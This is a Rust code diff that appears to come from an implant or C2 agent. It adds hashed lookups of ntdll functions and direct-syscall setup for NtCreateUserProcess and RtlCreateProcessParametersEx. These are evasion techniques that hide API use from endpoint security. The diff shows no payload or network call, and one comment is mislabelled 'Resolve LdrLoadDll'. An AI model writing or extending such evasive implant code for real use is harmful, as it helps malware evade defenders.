@@ -166,6 +166,7 @@ unsafe fn init_global_instance() {
         const NTDLL_HASH: u32 = 0x1edab0ed;
 
         pub const LDR_LOAD_DLL_DBJ2: usize = 0x9e456a43;
+        pub const RTLCREATEPROCESSPARAMETERSEX_DBJ2: usize = 0x533a05db;
         const NT_ALLOCATE_VIRTUAL_MEMORY: usize = 0xf783b8ec;
         const NT_FREE_VIRTUAL_MEMORY: usize = 0x2802c609;
 
@@ -183,7 +184,8 @@ unsafe fn init_global_instance() {
 
         const NT_CREATE_THREAD_EX_TOKEN: usize = 0xaf18cfb0;
         const NT_WAIT_FOR_SINGLE_OBJECT_TOKEN: usize = 0xe8ac0c3c;
-        pub const NT_OPEN_PROCESS_TOKEN: usize = 0x4b82f718;
+        const NT_OPEN_PROCESS_TOKEN: usize = 0x4b82f718;
+        const NT_CREATE_USER_PROCESS_TOKEN: usize = 0x54ce5f79;
 
         let mut instance = Instance::new();
 
@@ -196,6 +198,14 @@ unsafe fn init_global_instance() {
         // Resolve LdrLoadDll
         let ldr_load_dll_addr = ldr_function_addr(instance.ntdll.module_base, LDR_LOAD_DLL_DBJ2);
         instance.ntdll.ldr_load_dll = core::mem::transmute(ldr_load_dll_addr);
+
+        // Resolve LdrLoadDll
+        let rtl_create_process_parameters_ex_addr = ldr_function_addr(
+            instance.ntdll.module_base,
+            RTLCREATEPROCESSPARAMETERSEX_DBJ2,
+        );
+        instance.ntdll.rtl_create_process_parameters_ex =
+            core::mem::transmute(rtl_create_process_parameters_ex_addr);
 
         // NtAllocateVirtualMemory
         instance.ntdll.nt_allocate_virtual_memory.syscall.address =
@@ -286,6 +296,12 @@ unsafe fn init_global_instance() {
             ldr_function_addr(instance.ntdll.module_base, NT_WAIT_FOR_SINGLE_OBJECT_TOKEN);
         instance.ntdll.nt_wait_for_single_object.syscall.number =
             get_syscall_number(instance.ntdll.nt_wait_for_single_object.syscall.address);
+
+        // NtCreateUserProcess
+        instance.ntdll.nt_create_user_process.syscall.address =
+            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_USER_PROCESS_TOKEN);
+        instance.ntdll.nt_create_user_process.syscall.number =
+            get_syscall_number(instance.ntdll.nt_create_user_process.syscall.address);
 
         // Init Session Data
         instance.session.connected = false;
